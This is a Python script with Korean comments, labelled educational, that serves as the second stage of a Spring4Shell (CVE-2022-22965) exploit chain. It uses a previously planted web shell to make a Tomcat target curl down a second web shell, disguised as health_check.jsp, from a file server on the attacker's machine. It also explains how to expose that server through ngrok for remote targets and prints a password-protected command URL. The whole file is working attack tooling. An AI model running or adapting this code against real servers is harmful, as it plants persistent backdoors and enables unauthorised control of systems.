"""
Spring4Shell (CVE-2022-22965) - Stage 2 Uploader
교육 목적 전용 (For Educational Purposes Only)

[원격 환경 사용 시 필요한 것]
1. 공격자 PC가 외부에서 접근 가능한 URL이 있어야 합니다.
   - 로컬 도커 환경: host.docker.internal (자동)
   - 원격 환경: ngrok, 공개 웹서버 등 (ATTACKER_PUBLIC_URL 수동 설정 필요)

2. Stage 1 웹쉘(yaho4.jsp)이 먼저 타겟 서버에 생성되어 있어야 합니다.
   → python3 stage1_dropper.py 먼저 실행
"""

import urllib.request
import urllib.parse
import threading
import http.server
import os
import time
from abc import ABC, abstractmethod


# ==========================================
# 1. Core Domain (Entities)
# ==========================================
class UploadConfig:
    """
    Stage 2 배포에 필요한 설정값

    [원격 환경 설정 방법]
    - stager_url  : 교육기관에서 제공한 URL로 변경 (예: http://xx.xx.xx.xx:8080/yaho4.jsp)
    - attacker_url: 공격자 PC의 외부 접근 가능 URL (ngrok 등)
                    None 이면 Docker Mac 환경 (host.docker.internal) 사용
    """
    def __init__(
        self,
        stager_url: str         = "http://localhost:8011/yaho4.jsp",
        stage2_file: str        = "health_check.jsp",
        local_serve_port: int   = 9090,
        target_save_dir: str    = "/usr/local/tomcat/webapps/ROOT",
        attacker_url: str       = None,      # None = Docker Mac 자동 설정
    ):
        self.stager_url       = stager_url
        self.stage2_file      = stage2_file
        self.local_serve_port = local_serve_port
        self.target_save_dir  = target_save_dir

        # 공격자 서버 URL 자동 결정
        if attacker_url:
            self.attacker_url = attacker_url.rstrip("/")
        else:
            # Docker Mac 환경: host.docker.internal 로 자동 설정
            self.attacker_url = f"http://host.docker.internal:{local_serve_port}"


# ==========================================
# 2. Interface Ports (Use Case Boundaries)
# ==========================================
class FileServerPort(ABC):
    @abstractmethod
    def start(self, directory: str, port: int): pass
    @abstractmethod
    def stop(self): pass


class Stage1CommandPort(ABC):
    @abstractmethod
    def execute(self, stager_url: str, command: str) -> str: pass


# ==========================================
# 3. Infrastructure Adapters
# ==========================================
class SilentHTTPHandler(http.server.SimpleHTTPRequestHandler):
    """로그 출력 최소화 HTTP 핸들러"""
    def log_message(self, format, *args):
        print(f"  [파일서버] 요청 수신: {args[0] if args else ''}")


class LocalFileServerAdapter(FileServerPort):
    """공격자 PC를 임시 파일 배포 서버로 만드는 어댑터"""
    def __init__(self):
        self._server = None
        self._thread = None

    def start(self, directory: str, port: int):
        os.chdir(directory)
        self._server = http.server.HTTPServer(("", port), SilentHTTPHandler)
        self._thread = threading.Thread(target=self._server.serve_forever, daemon=True)
        self._thread.start()
        print(f"[*] 로컬 파일 서버 시작: http://0.0.0.0:{port}/")

    def stop(self):
        if self._server:
            self._server.shutdown()
            print("[*] 로컬 파일 서버 종료.")


class Stage1CommandAdapter(Stage1CommandPort):
    """
    Stage 1 웹쉘(yaho4.jsp)에 명령을 전달하는 어댑터

    [핵심]
    Java Runtime.exec(String)은 공백으로 인수를 분리합니다.
    즉, "curl http://url -o /path" → ["curl", "http://url", "-o", "/path"] 로 분리되어 정상 실행됩니다.
    """
    def execute(self, stager_url: str, command: str) -> str:
        encoded_cmd = urllib.parse.quote(command)
        full_url    = f"{stager_url}?cmd={encoded_cmd}"
        try:
            res = urllib.request.urlopen(full_url, timeout=15)
            return res.read().decode("utf-8", errors="ignore")
        except Exception as e:
            return f"[ERROR] {e}"


# ==========================================
# 4. Use Case (Application Logic)
# ==========================================
class Stage2UploadUseCase:
    """Stage 1 쉘을 이용해 Stage 2 웹쉘을 원격 타겟에 배포하는 유즈케이스"""
    def __init__(
        self,
        file_server: FileServerPort,
        executor:    Stage1CommandPort,
        config:      UploadConfig,
    ):
        self.file_server = file_server
        self.executor    = executor
        self.config      = config

    def run(self):
        download_url = f"{self.config.attacker_url}/{self.config.stage2_file}"
        dest_path    = f"{self.config.target_save_dir}/{self.config.stage2_file}"

        print(f"\n[설정 확인]")
        print(f"  Stage 1 웹쉘  : {self.config.stager_url}")
        print(f"  다운로드 URL  : {download_url}")
        print(f"  저장 경로     : {dest_path}")
        print()

        # Step 1. 로컬 파일 서버 시작
        script_dir = os.path.dirname(os.path.abspath(__file__))
        self.file_server.start(script_dir, self.config.local_serve_port)
        time.sleep(1)

        # Step 2. Stage 1 쉘로 curl 명령 실행 → health_check.jsp 다운로드
        # Java exec(String)은 공백으로 인수 분리 → "curl URL -o /path" 정상 동작
        download_cmd = f"curl -sL {download_url} -o {dest_path}"
        print(f"[*] Stage 1 쉘에 명령 전달:")
        print(f"    ▶  {download_cmd}")
        output = self.executor.execute(self.config.stager_url, download_cmd)
        print(f"[*] 반환값: {output[:150].strip() or '(없음 → 정상)'}")

        time.sleep(3)

        # Step 3. 파일 존재 확인
        check_cmd    = f"ls -la {dest_path}"
        check_output = self.executor.execute(self.config.stager_url, check_cmd)
        print(f"[*] 파일 확인: {check_output[:200].strip()}")

        self.file_server.stop()

        # Step 4. 결과 안내
        stage2_url = f"{self.config.stager_url.rsplit('/yaho4.jsp', 1)[0].rsplit('/', 2)[0]}/{self.config.stage2_file}?pwd=glory&cmd=id"
        if self.config.stage2_file in check_output:
            print(f"\n[✅ 성공!] Stage 2 웹쉘이 타겟 서버에 배포되었습니다!")
        else:
            print(f"\n[⚠️  파일 확인 불가] 아래 URL로 직접 접근해 보세요:")
        print(f"[🌐 Stage 2 URL] {stage2_url}")


# ==========================================
# 5. Entry Point — 터미널에서 URL 직접 입력
# ==========================================
if __name__ == "__main__":

    print("=" * 60)
    print("  Spring4Shell - Stage 2 배포 (CVE-2022-22965)")
    print("=" * 60)
    print()
    print("[안내] Stage 1 웹쉘 URL과 공격자 서버 URL을 입력하세요.")
    print("       Enter만 치면 로컬 도커 환경 기본값이 사용됩니다.")
    print()

    # ── Stage 1 웹쉘 URL 입력 ──────────────────────────────
    DEFAULT_STAGER = "http://localhost:8011/yaho4.jsp"
    stager_input   = input(f"  [?] Stage 1 웹쉘 URL (기본값: {DEFAULT_STAGER}): ").strip()
    stager_url     = stager_input if stager_input else DEFAULT_STAGER

    # ── 공격자 서버 URL 입력 ───────────────────────────────
    print()
    print("  [안내] 공격자 서버 URL:")
    print("         - 로컬 도커 환경  → Enter만 치면 자동 설정 (host.docker.internal)")
    print("         - 원격 환경       → ngrok 등으로 발급받은 공개 URL 입력")
    print("           예) http://xxxx-xxx-xxx.ngrok-free.app")
    attacker_input = input("  [?] 공격자 서버 URL (로컬이면 Enter): ").strip()
    attacker_url   = attacker_input if attacker_input else None

    print()

    # ── UploadConfig 구성 ──────────────────────────────────
    config = UploadConfig(
        stager_url       = stager_url,
        stage2_file      = "health_check.jsp",
        local_serve_port = 9090,
        target_save_dir  = "/usr/local/tomcat/webapps/ROOT",
        attacker_url     = attacker_url,
    )

    file_server = LocalFileServerAdapter()
    executor    = Stage1CommandAdapter()
    use_case    = Stage2UploadUseCase(file_server, executor, config)
    use_case.run()

